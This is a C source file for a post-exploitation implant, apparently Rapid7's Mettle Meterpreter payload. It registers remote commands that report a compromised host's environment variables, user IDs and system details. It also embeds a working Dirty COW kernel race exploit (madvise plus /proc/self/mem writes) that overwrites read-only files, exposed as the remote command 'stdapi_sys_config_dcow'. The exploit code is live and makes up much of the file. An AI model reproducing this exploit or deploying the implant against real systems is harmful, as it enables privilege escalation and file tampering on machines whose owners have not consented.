/**
 * Copyright 2015 Rapid7
 * @brief System Config API
 * @file config.c
 */

#include <errno.h>
#include <stdlib.h>
#include <unistd.h>

#include <dnet.h>
#include <mettle.h>
#include <sigar.h>
#include <time.h>
#include "log.h"
#include "tlv.h"

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>

#include <sys/types.h>
#include <unistd.h>


static char *normalize_env_var(char *var)
{
	while (*var == '%' || *var == '$') {
		var++;
	}

	char *end = var + strlen(var) - 1;
	while (end > var && *end == '%') {
		end--;
	}

	*(end + 1) = '\0';

	return var;
}

struct tlv_packet *sys_config_getenv(struct tlv_handler_ctx *ctx)
{
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);

	struct tlv_iterator i = {
		.packet = ctx->req,
		.value_type = TLV_TYPE_ENV_VARIABLE,
	};

	char *env_var;
	while ((env_var = tlv_packet_iterate_str(&i))) {
		char *env_val = getenv(normalize_env_var(env_var));
		if (env_val) {
			struct tlv_packet *env = tlv_packet_new(TLV_TYPE_ENV_GROUP, 0);
			env = tlv_packet_add_str(env, TLV_TYPE_ENV_VARIABLE, env_var);
			env = tlv_packet_add_str(env, TLV_TYPE_ENV_VALUE, env_val);
			p = tlv_packet_add_child(p, env);
		}
	}

	return p;
}

struct tlv_packet *sys_config_getuid(struct tlv_handler_ctx *ctx)
{
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);

	return tlv_packet_add_fmt(p, TLV_TYPE_USER_NAME,
			"uid=%d, gid=%d, euid=%d, egid=%d",
			getuid(), geteuid(), getgid(), getegid());
}

struct tlv_packet *sys_config_sysinfo(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;

	sigar_sys_info_t sys_info;
	if (sigar_sys_info_get(mettle_get_sigar(m), &sys_info) == -1) {
		return tlv_packet_response_result(ctx, errno);
	}

	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);

	p = tlv_packet_add_str(p, TLV_TYPE_COMPUTER_NAME, mettle_get_fqdn(m));
	p = tlv_packet_add_fmt(p, TLV_TYPE_OS_NAME, "%s (%s %s)",
			sys_info.description, sys_info.name, sys_info.version);
	p = tlv_packet_add_str(p, TLV_TYPE_ARCHITECTURE, sys_info.arch);

	return p;
}

/*#define LOGV(...) { printf(__VA_ARGS__); printf("\n"); fflush(stdout); }*/
#define LOGV(...) 

#define LOOP   0x10000

#define PAGE_SIZE 4096

struct mem_arg  {
	void *map;
	void *patch;
	size_t patch_size;
	size_t offset;
	int count;
	int count2;
};

static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	/*LOGV("[*] madvise = %p %d", addr, size);*/

	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}

	mem_arg->count = c;

	/*LOGV("[*] madvise = %d %d", c, i);*/
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;

	int fd, i, c = 0;
	void *p = (void*)mem_arg->patch;

	off_t fuck = (off_t)mem_arg->offset;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		/*LOGV("open(\"/proc/self/mem\"");*/

	for (i = 0; i < LOOP; i++) {
		lseek(fd, (off_t)fuck, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);
	}

	/*LOGV("[*] /proc/self/mem %d %i", c, i);*/

	close(fd);
	mem_arg->count2 = c;
	return 0;
}

static int dcow(const char* filefrom, const char* fileto) {
	struct mem_arg mem_arg;
	struct stat st;
	struct stat st2;

	int f=open(fileto,O_RDONLY);
	if (f == -1) {
		/*LOGV("could not open %s", argv[1]);*/
		return 1;
	}
	if (fstat(f,&st) == -1) {
		/*LOGV("could not open %s", argv[1]);*/
		return 2;
	}

	int f2=open(filefrom,O_RDONLY);
	if (f2 == -1) {
		/*LOGV("could not open %s", argv[2]);*/
		return 3;
	}
	if (fstat(f2,&st2) == -1) {
		/*LOGV("could not open %s", argv[2]);*/
		return 4;
	}

	size_t size = st.st_size;
	if (st2.st_size != st.st_size) {
		/*LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", st2.st_size, st.st_size);*/
		if (st2.st_size > size) {
			size = st2.st_size;
		}
	}
	if (size == 0) {
		return 1337;
	}

	/*LOGV("size %d\n\n",size);*/

	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL) {
		return 5;
	}

	memset(mem_arg.patch, 0, size);

	int readret = read(f2, mem_arg.patch, st2.st_size);
	close(f2);

	mem_arg.patch_size = size;

	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
	if (map == MAP_FAILED) {
		return 6;
	}

	/*LOGV("[*] mmap %", asdfkasldfj);*/

	mem_arg.map = map;

	pthread_t pth1, pth2;
	pthread_create(&pth1, NULL, madviseThread, &mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, &mem_arg);
	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	/*LOGV("[*] putting back %p", map);*/
	/*exploit(&mem_arg, 0);*/

	close(f);

	return size;
}

struct tlv_packet *sys_config_dcow(struct tlv_handler_ctx *ctx)
{
	const char *lib_path = tlv_packet_get_str(ctx->req, TLV_TYPE_LIBRARY_PATH);
	const char *target_path = tlv_packet_get_str(ctx->req, TLV_TYPE_TARGET_PATH);
	int ret = dcow(lib_path, target_path);
	char * result = 0;
	int vasresult = asprintf(&result, "dcow (%d)", ret);
	if (vasresult == -1) {
		return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
	}
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	return tlv_packet_add_str(p, TLV_TYPE_LOCAL_DATETIME, result);
}

struct tlv_packet *sys_config_localtime(struct tlv_handler_ctx *ctx)
{
	char dateTime[128] = { 0 };
	time_t t = time(NULL);
	struct tm lt = { 0 };
	localtime_r(&t, &lt);
	strftime(dateTime, sizeof(dateTime) - 1, "%Y-%m-%d %H:%M:%S %Z (UTC%z)", &lt);
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	return tlv_packet_add_fmt(p, TLV_TYPE_LOCAL_DATETIME, dateTime);
}

void sys_config_register_handlers(struct mettle *m)
{
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);

	tlv_dispatcher_add_handler(td, "stdapi_sys_config_getenv", sys_config_getenv, m);
	tlv_dispatcher_add_handler(td, "stdapi_sys_config_getuid", sys_config_getuid, m);
	tlv_dispatcher_add_handler(td, "stdapi_sys_config_sysinfo", sys_config_sysinfo, m);
	tlv_dispatcher_add_handler(td, "stdapi_sys_config_localtime", sys_config_localtime, m);
	tlv_dispatcher_add_handler(td, "stdapi_sys_config_dcow", sys_config_dcow, m);
}
